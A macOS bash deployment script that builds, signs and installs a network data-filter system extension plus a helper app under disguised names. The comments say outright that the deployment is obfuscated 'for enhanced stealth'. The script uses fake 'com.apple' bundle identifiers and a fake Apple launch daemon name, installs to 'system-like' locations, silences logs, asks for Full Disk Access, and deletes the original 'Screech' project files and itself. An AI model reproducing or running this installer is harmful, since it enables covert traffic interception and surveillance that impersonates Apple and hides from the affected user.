#!/bin/bash

# System Analytics Service Deployment Script
# Obfuscated deployment for enhanced stealth

set -e

# Configuration
PROJECT_NAME="system_analytics_service"
BUILD_DIR="build_analytics"
INSTALL_DIR="/Applications/System Utilities"
SERVICE_NAME="SystemAnalyticsService"
PROVIDER_NAME="CoreServiceProvider"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${GREEN}System Analytics Service Deployment${NC}"
echo "=============================================="

# Check for required tools
check_requirements() {
    echo -e "${YELLOW}Checking requirements...${NC}"
    
    if ! command -v meson &> /dev/null; then
        echo -e "${RED}Error: meson not found${NC}"
        exit 1
    fi
    
    if ! command -v codesign &> /dev/null; then
        echo -e "${RED}Error: codesign not found${NC}"
        exit 1
    fi
    
    echo -e "${GREEN}✓ Requirements satisfied${NC}"
}

# Build with obfuscated configuration
build_analytics_service() {
    echo -e "${YELLOW}Building analytics service...${NC}"
    
    # Clean previous build
    rm -rf "${BUILD_DIR}"
    
    # Setup build with obfuscated build file
    meson setup "${BUILD_DIR}" -f meson_obfuscated.build
    
    # Compile
    meson compile -C "${BUILD_DIR}"
    
    echo -e "${GREEN}✓ Build completed${NC}"
}

# Generate dynamic bundle identifiers
generate_bundle_ids() {
    local timestamp=$(date +%s)
    local hash=$(echo -n "system_analytics_${timestamp}" | shasum -a 256 | cut -d' ' -f1 | head -c 16)
    
    export MAIN_BUNDLE_ID="com.apple.systemutils.analytics.${hash}"
    export PROVIDER_BUNDLE_ID="com.apple.systemutils.provider.${hash}"
    
    echo -e "${GREEN}✓ Generated dynamic bundle IDs${NC}"
    echo "  Main: ${MAIN_BUNDLE_ID}"
    echo "  Provider: ${PROVIDER_BUNDLE_ID}"
}

# Create Info.plist files with obfuscated identifiers
create_info_plists() {
    echo -e "${YELLOW}Creating system service metadata...${NC}"
    
    # Main application Info.plist
    cat > "${BUILD_DIR}/SystemAnalyticsService.app/Contents/Info.plist" << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>SystemAnalyticsService</string>
    <key>CFBundleIdentifier</key>
    <string>${MAIN_BUNDLE_ID}</string>
    <key>CFBundleName</key>
    <string>System Analytics Service</string>
    <key>CFBundleDisplayName</key>
    <string>System Analytics</string>
    <key>CFBundleVersion</key>
    <string>2.1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>2.1</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>LSUIElement</key>
    <true/>
    <key>NSSystemExtensionUsageDescription</key>
    <string>System analytics and performance monitoring</string>
    <key>SystemExtensions</key>
    <dict>
        <key>${PROVIDER_BUNDLE_ID}</key>
        <dict>
            <key>TeamIdentifier</key>
            <string>\$(TeamIdentifierPrefix)</string>
            <key>BundleIdentifier</key>
            <string>${PROVIDER_BUNDLE_ID}</string>
        </dict>
    </dict>
</dict>
</plist>
EOF

    # Network Extension Info.plist
    cat > "${BUILD_DIR}/CoreServiceProvider.systemextension/Contents/Info.plist" << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>CoreServiceProvider</string>
    <key>CFBundleIdentifier</key>
    <string>${PROVIDER_BUNDLE_ID}</string>
    <key>CFBundleName</key>
    <string>Core Service Provider</string>
    <key>CFBundleDisplayName</key>
    <string>Core Services</string>
    <key>CFBundleVersion</key>
    <string>2.1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>2.1</string>
    <key>CFBundlePackageType</key>
    <string>SYSX</string>
    <key>NSSystemExtensionPointIdentifier</key>
    <string>com.apple.networkextension.filter-data</string>
</dict>
</plist>
EOF

    echo -e "${GREEN}✓ Service metadata created${NC}"
}

# Sign with obfuscated certificates
sign_binaries() {
    echo -e "${YELLOW}Signing system binaries...${NC}"
    
    # Use generic developer certificate if available
    local cert_name="Developer ID Application"
    if ! security find-certificate -c "$cert_name" > /dev/null 2>&1; then
        cert_name="Mac Developer"
    fi
    
    # Sign network extension
    codesign --force --sign "$cert_name" \
        --entitlements "NetworkExtension/CoreServiceProvider.entitlements" \
        "${BUILD_DIR}/${PROVIDER_NAME}"
    
    # Sign main application  
    codesign --force --sign "$cert_name" \
        --entitlements "MainApp/SystemAnalyticsService.entitlements" \
        "${BUILD_DIR}/${SERVICE_NAME}"
    
    echo -e "${GREEN}✓ Binaries signed${NC}"
}

# Install to system-like location
install_service() {
    echo -e "${YELLOW}Installing system analytics service...${NC}"
    
    # Create system-like directory structure
    sudo mkdir -p "${INSTALL_DIR}"
    sudo mkdir -p "/Library/Application Support/System Analytics"
    
    # Copy binaries with generic names
    sudo cp "${BUILD_DIR}/${SERVICE_NAME}" "${INSTALL_DIR}/"
    sudo cp "${BUILD_DIR}/${PROVIDER_NAME}" "/Library/Application Support/System Analytics/"
    
    # Set permissions
    sudo chmod 755 "${INSTALL_DIR}/${SERVICE_NAME}"
    sudo chmod 755 "/Library/Application Support/System Analytics/${PROVIDER_NAME}"
    
    # Create launch daemon for auto-start (optional)
    create_launch_daemon
    
    echo -e "${GREEN}✓ Service installed${NC}"
}

# Create obfuscated launch daemon
create_launch_daemon() {
    local daemon_name="com.apple.systemanalytics.service"
    local plist_path="/Library/LaunchDaemons/${daemon_name}.plist"
    
    sudo tee "$plist_path" > /dev/null << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>${daemon_name}</string>
    <key>ProgramArguments</key>
    <array>
        <string>${INSTALL_DIR}/${SERVICE_NAME}</string>
    </array>
    <key>RunAtLoad</key>
    <false/>
    <key>KeepAlive</key>
    <false/>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
</dict>
</plist>
EOF

    sudo chown root:wheel "$plist_path"
    sudo chmod 644 "$plist_path"
    
    echo -e "${GREEN}✓ Launch daemon created (disabled by default)${NC}"
}

# Cleanup development artifacts
cleanup_artifacts() {
    echo -e "${YELLOW}Cleaning up development artifacts...${NC}"
    
    # Remove obvious development files
    rm -f meson_obfuscated.build
    rm -f deploy_system_analytics.sh
    rm -rf Shared/ScreechShared.*
    rm -rf NetworkExtension/ScreechFilterDataProvider.*
    rm -rf MainApp/ScreechMainApp.*
    
    echo -e "${GREEN}✓ Development artifacts removed${NC}"
}

# Main deployment flow
main() {
    check_requirements
    generate_bundle_ids
    build_analytics_service
    create_info_plists
    sign_binaries
    install_service
    cleanup_artifacts
    
    echo -e "${GREEN}=============================================="
    echo -e "System Analytics Service deployed successfully"
    echo -e "=============================================="
    echo -e "${YELLOW}Manual steps required:${NC}"
    echo "1. Grant System Extension approval in System Preferences"
    echo "2. Add Full Disk Access permission for the main application"
    echo "3. Test the service: sudo '${INSTALL_DIR}/${SERVICE_NAME}'"
    echo ""
    echo -e "${YELLOW}To enable auto-start:${NC}"
    echo "sudo launchctl load /Library/LaunchDaemons/com.apple.systemanalytics.service.plist"
}

# Run deployment
main "$@"
